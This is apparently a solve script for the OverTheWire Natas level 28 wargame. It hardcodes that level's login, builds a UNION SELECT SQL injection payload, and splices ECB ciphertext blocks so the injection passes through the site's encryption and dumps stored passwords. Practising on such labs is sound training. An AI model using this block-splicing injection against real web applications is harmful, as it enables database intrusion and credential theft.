#!/usr/bin/env python3

import requests
import urllib.parse
import base64

# post with data: s.post(url, data = {"name": "value"})
# get with data: s.get(url, params = {"name": "value"})
# proxy: s.get(url, proxies = burp_proxy)

username = 'natas28'
password = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'

url = f"http://{username}.natas.labs.overthewire.org/"

burp_proxy = {"http": "http://127.0.0.1:8080"}

def main():
    with requests.Session() as s:
        s.auth = (username, password)
        block_size = 16

        injection = f"{'a'*9}' UNION SELECT password FROM users; #"

        blocks = (len(injection) - 10 ) / block_size
        if(len(injection) - 10) % block_size != 0: blocks += 1
        print(blocks)

        res = s.post(url, data = {"query": injection})
        raw_inject = base64.b64decode(urllib.parse.unquote(res.url[60:]))


        res = s.post(url, data = {"query": "a"* 10})
        good = base64.b64decode(urllib.parse.unquote(res.url[60:]))

        query = good[:16*3] + raw_inject[16*3:16*3+(3*16)] + good[16*3:]
        query = base64.b64encode(query)


        res = s.get(url+"/search.php", params = {"query": query})
        print(res.text)


if __name__ == "__main__":
    main()
